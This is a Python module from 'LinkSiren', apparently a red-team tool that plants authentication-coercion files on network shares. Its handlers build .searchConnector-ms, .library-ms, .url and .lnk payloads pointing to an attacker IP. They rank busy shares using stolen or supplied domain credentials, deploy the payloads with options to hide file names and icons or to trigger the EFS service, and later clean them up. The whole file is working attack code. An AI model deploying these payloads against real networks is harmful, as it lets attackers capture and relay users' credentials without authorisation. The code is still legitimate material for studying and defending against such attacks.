"""
This module contains handlers for various modes of operation in the LinkSiren application.
Functions:
    handle_generate(args):
        Generates a payload file based on the provided arguments and writes it to the local
        filesystem.
    handle_rank(args, domain, username, password):
        Reads target data, computes rankings based on the provided arguments, and writes the
        rankings to a file.
    handle_identify(args, domain, username, password):
        Identifies and filters targets based on rankings and writes the filtered targets to a file.
    handle_deploy(args, domain, username, password):
        Deploys the generated payload to the specified targets and logs the paths where the payload
        was written.
    handle_cleanup(args, domain, username, password):
        Cleans up the deployed payloads from the specified targets.
"""

import json
import logging
from datetime import datetime
from pathlib import Path
import sys
from linksiren.impure_functions import (
    read_targets,
    get_sorted_rankings,
    write_payload_local,
    write_list_to_file,
    get_lnk_template,
)
from linksiren.pure_functions import (
    filter_targets,
    is_valid_payload_name,
    create_lnk_payload,
    compute_threshold_date,
    make_invisible_payload_name,
    make_invisible_payload_contents,
)


def handle_generate(args):
    """
    Handles the generation of payload files based on the provided arguments.
    Args:
        args: An object containing the following attributes:
            - payload (str): The name of the payload file to be generated.
            - attacker (str): The attacker's IP address to be included in the payload.
    The function performs the following steps:
    1. Checks if the payload name has a valid extension.
    2. Determines the template path based on the payload extension.
    3. Reads the appropriate template file and formats it with the attacker's IP address.
    4. Writes the formatted payload contents to the specified payload file.
    Supported payload extensions:
    - .searchConnector-ms
    - .library-ms
    - .url
    - .lnk
    If the payload extension is '.lnk', a special handling is performed using `get_lnk_template`
    and `create_lnk_payload`.
    """
    available_extensions = [".searchConnector-ms", ".library-ms", ".url", ".lnk"]
    if not is_valid_payload_name(args.payload, available_extensions):
        return

    payload_extension = Path(args.payload).suffix
    template_path = Path(__file__).parent / f"template{payload_extension}"
    invisible = getattr(args, "invisible", False)

    if payload_extension == ".lnk":
        lnk_template = get_lnk_template(template_path)
        payload_contents = create_lnk_payload(args.attacker, lnk_template)
        if invisible:
            # Filename gets the SOH prefix; icon-blanking for .lnk is not
            # supported (would require binary template surgery).
            logging.getLogger("main_logger").warning(
                "--invisible only blanks the filename for .lnk payloads; "
                "icon blanking is unsupported for binary lnk templates.",
                extra={"path": args.payload},
            )
    else:
        with open(template_path, "r", encoding="utf-8") as template_file:
            payload_contents = template_file.read()
            payload_contents = payload_contents.format(attacker_ip=args.attacker)
        if invisible:
            payload_contents = make_invisible_payload_contents(
                payload_contents, payload_extension
            )

    payload_name = (
        make_invisible_payload_name(args.payload) if invisible else args.payload
    )
    write_payload_local(payload_name, payload_contents)


def handle_rank(args, credentials, log_queue):
    """
    Handles the ranking process for the given domain using the provided credentials and arguments.
    Args:
        args (Namespace): A namespace object containing the following attributes:
            - active_threshold (int): The threshold for active links.
            - targets (str): The path to the targets file.
            - max_depth (int): The maximum depth for ranking.
            - fast (bool): A flag indicating whether to use the fast mode.
        domain (str): The domain to be ranked.
        username (str): The username for authentication.
        password (str): The password for authentication.
    Returns:
        None
    Side Effects:
        Writes the sorted rankings to a file named 'folder_rankings.txt' in JSON format.
    """
    threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
    targets = read_targets(args.targets)
    sorted_rankings = get_sorted_rankings(
        targets=targets,
        credentials=credentials,
        active_threshold_date=threshold_date,
        max_depth=args.max_depth,
        go_fast=args.fast,
        log_queue=log_queue,
        max_concurrency=args.max_concurrency,
        ignore_folders=args.ignore_shares,
    )

    with open("folder_rankings.txt", mode="w", encoding="utf-8") as f:
        f.write(json.dumps(sorted_rankings, indent=4, sort_keys=False))


def handle_identify(args, credentials, log_queue):
    """
    Handles the identification process based on the provided arguments and credentials.

    Args:
        args (Namespace): A namespace object containing the following attributes:
            - active_threshold (int): The threshold in days to consider a target as active.
            - targets (str): The path to the file containing the list of targets.
            - max_depth (int): The maximum depth to search for targets.
            - fast (bool): A flag indicating whether to perform a faster, less thorough search.
            - max_folders_per_target (int): The maximum number of folders to consider per target.
        domain (str): The domain to authenticate against.
        username (str): The username for authentication.
        password (str): The password for authentication.

    Returns:
        None
    """
    threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
    targets = read_targets(args.targets)
    sorted_rankings = get_sorted_rankings(
        targets=targets,
        credentials=credentials,
        active_threshold_date=threshold_date,
        max_depth=args.max_depth,
        go_fast=args.fast,
        log_queue=log_queue,
        max_concurrency=args.max_concurrency,
        ignore_folders=args.ignore_shares,
    )
    filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)
    write_list_to_file(filtered_targets, "payload_targets.txt")


def handle_deploy(args, credentials):
    """
    Handles the deployment of payloads to specified targets.
    Args:
        args (Namespace): Command-line arguments containing the payload name, attacker IP,
                          and targets.
        domain (str): The domain to use for connecting to targets.
        username (str): The username to use for connecting to targets.
        password (str): The password to use for connecting to targets.
    Returns:
        None
    """
    targets = read_targets(args.targets)
    payloads_written = []
    available_extensions = [".searchConnector-ms", ".library-ms", ".url", ".lnk"]
    if not is_valid_payload_name(args.payload, available_extensions):
        return

    payload_extension = Path(args.payload).suffix
    template_path = Path(__file__).parent / f"template{payload_extension}"
    invisible = getattr(args, "invisible", False)

    if payload_extension == ".lnk":
        lnk_template = get_lnk_template(template_path)
        payload_contents = create_lnk_payload(args.attacker, lnk_template)
        if invisible:
            logging.getLogger("main_logger").warning(
                "--invisible only blanks the filename for .lnk payloads; "
                "icon blanking is unsupported for binary lnk templates.",
                extra={"path": args.payload},
            )
    else:
        with open(template_path, "r", encoding="utf-8") as template_file:
            template_contents = template_file.read()
            payload_contents = template_contents.format(attacker_ip=args.attacker)
        if invisible:
            payload_contents = make_invisible_payload_contents(
                payload_contents, payload_extension
            )

    payload_name = (
        make_invisible_payload_name(args.payload) if invisible else args.payload
    )
    force = getattr(args, "force", False)
    encrypt = getattr(args, "encrypt", False)
    encrypt_keep = getattr(args, "encrypt_keep", False)
    encrypt_target = getattr(args, "encrypt_target", "payload")
    probe_delete = getattr(args, "probe_delete", False)
    encrypt_hosts = set()  # Hosts where we likely woke EFS
    for target in targets:
        target.connect(credentials)
        for path in target.paths:
            new_payload_path = target.write_payload(
                path=path,
                payload_name=payload_name,
                payload=payload_contents,
                force=force,
                encrypt=encrypt,
                encrypt_keep=encrypt_keep,
                encrypt_target=encrypt_target,
                probe_delete=probe_delete,
            )
            if new_payload_path is not None:
                payloads_written.append(new_payload_path)
                if encrypt:
                    encrypt_hosts.add(target.host)

    write_list_to_file(payloads_written, "payloads_written.txt", "w")
    # Sidecar tracking: which hosts likely have an EFS service started by
    # the --encrypt trigger. Cleanup uses this to WARN that the EFS service
    # is probably still Running on those hosts even after the payload is
    # deleted — a real artifact left by the engagement.
    if encrypt_hosts:
        write_list_to_file(
            sorted(encrypt_hosts), "encrypt_triggered_hosts.txt", "w"
        )


def handle_cleanup(args, credentials):
    """
    Handles the cleanup process by connecting to each target and deleting specified payloads.

    Args:
        args (Namespace): A namespace object containing the following attributes:
            - targets (str): Path to the file containing the list of targets.
            - payload (str): The payload to be deleted from each target.
        domain (str): The domain to use for connecting to the targets.
        username (str): The username to use for connecting to the targets.
        password (str): The password to use for connecting to the targets.

    Returns:
        None
    """
    payloads_not_deleted = []
    targets = read_targets(args.targets)
    for target in targets:
        target.connect(credentials)
        # Use ``extend`` so failures from earlier hosts aren't dropped on the
        # floor when iterating multiple targets.
        payloads_not_deleted.extend(target.delete_payloads())

    write_list_to_file(payloads_not_deleted, "payloads_not_deleted.txt", "w")

    # If the prior deploy tracked --encrypt-triggered hosts, warn that the
    # EFS service is likely still Running on them — deleting the payload
    # does not stop the service. The pentester can verify with:
    #   Get-Service EFS  (PowerShell on the target)
    try:
        with open("encrypt_triggered_hosts.txt", encoding="utf-8") as f:
            triggered = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        triggered = []
    if triggered:
        msg = (
            "EFS service is likely still RUNNING on "
            f"{len(triggered)} host(s) that received an --encrypt payload "
            "during deploy: "
            + ", ".join(triggered)
            + ". Cleanup removed the file(s) but did not stop the service. "
            "Verify with `Get-Service EFS` on each host; if stopping is "
            "required for engagement cleanliness, do so out-of-band."
        )
        logging.getLogger("main_logger").warning(msg, extra={"path": None})
        print(msg, file=sys.stderr)

    if len(payloads_not_deleted) == 0:
        print("All payloads deleted successfully.")
    else:
        print(
            "Some payloads could not be deleted. See 'payloads_not_deleted.txt' "
            "and CRITICAL level events in linksiren.log for details.",
            file=sys.stderr,
        )
